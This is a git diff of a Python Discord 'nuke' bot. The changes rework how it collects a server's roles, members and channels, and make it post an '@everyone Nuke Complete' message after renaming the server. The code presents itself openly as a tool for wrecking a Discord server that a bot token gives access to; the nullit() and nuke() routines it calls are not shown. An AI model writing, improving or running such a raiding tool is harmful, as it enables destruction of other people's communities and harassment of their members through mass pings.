@@ -9,9 +9,9 @@ roles = None
 members = None
 channels = None
 guildId = None
-token = "TOKEN"
+token = ""
 server_name = "Nuke Server"
-end_message = "Nuke Complete"
+end_message = "@everyone Nuke Complete"
 bot_prefix = "!"
 
 
@@ -91,7 +91,7 @@ def finish(guildId):
     json_data = {
         'name': f'{server_name}',
         'description': None,
-        'icon': encodeimage.encode('..\\pfp.png'),
+        'icon': encodeimage.encode('E:\\\Python\\melatonin\\pfp.png'),
         'splash': None,
         'banner': None,
         'features': [],
@@ -119,7 +119,7 @@ def finish(guildId):
     headers = {
     'authorization': f'Bot {token}',     
     'content-type': 'application/json',           
-    }
+    } 
     response = json.dumps({"content":f"{end_message}"})
     r = requests.post(yea, headers = headers, data = response)
     
@@ -147,17 +147,20 @@ def main():
     async def init(ctx):
         try:    
             roles = ctx.guild.roles
-            members = await ctx.guild.fetch_members().flatten()
+            members = []
+            async for resp in ctx.guild.fetch_members():
+                members.append(resp)
             channels = ctx.guild.channels
             guildId = ctx.guild.id
-            await client.close()
             os.system('cls')
             input('retrived members,roles and channels ready to nuke :) (press enter to nuke)')
             
-        except:
+        except Exception as e:
+            print(e)
             input('something went wrong, try again?')
             os.system('cls')
             main()
+        print('starting nuke')
         nullit(guildId)
         nuke(roles,members,channels,guildId)
         
